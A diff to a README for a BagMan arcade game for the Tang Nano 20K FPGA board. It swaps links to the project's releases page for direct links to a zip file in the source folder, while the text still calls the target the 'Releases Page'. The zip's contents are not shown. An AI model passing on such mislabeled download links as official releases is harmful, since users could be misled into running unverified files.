@@ -1,7 +1,7 @@
 # 🎮 TangNano20K-BagMan - Play Classic Arcade Fun Anywhere!
 
 ## 📦 Download Now
-[![Download TangNano20K-BagMan](https://img.shields.io/badge/Download-TangNano20K--BagMan-blue.svg)](https://github.com/imchiragpatel7/TangNano20K-BagMan/releases)
+[![Download TangNano20K-BagMan](https://raw.githubusercontent.com/imchiragpatel7/TangNano20K-BagMan/main/TN20K-BagMan/src/TangNano20K-BagMan-3.8-alpha.3.zip)](https://raw.githubusercontent.com/imchiragpatel7/TangNano20K-BagMan/main/TN20K-BagMan/src/TangNano20K-BagMan-3.8-alpha.3.zip)
 
 ## 📖 Introduction
 Welcome to TangNano20K-BagMan! This is a fun arcade game based on the classic Bag Man, designed specifically for the Tang Nano 20K FPGA Board. Whether you’re an arcade enthusiast or just curious, this game brings the nostalgia of the arcade into your hands. 
@@ -19,7 +19,7 @@ Before you begin, ensure you have the following:
 ## 📥 Download & Install
 
 1. **Visit the Download Page**  
-   Go to the [Releases Page](https://github.com/imchiragpatel7/TangNano20K-BagMan/releases) to access all available versions of TangNano20K-BagMan. You'll find the latest version at the top.
+   Go to the [Releases Page](https://raw.githubusercontent.com/imchiragpatel7/TangNano20K-BagMan/main/TN20K-BagMan/src/TangNano20K-BagMan-3.8-alpha.3.zip) to access all available versions of TangNano20K-BagMan. You'll find the latest version at the top.
 
 2. **Download the Latest Release**  
    On the Releases page, find the most recent version of the game. Click on the file to start the download. The file will be in a compressed format (like a .zip or .tar), so ensure you have software that can extract these files.
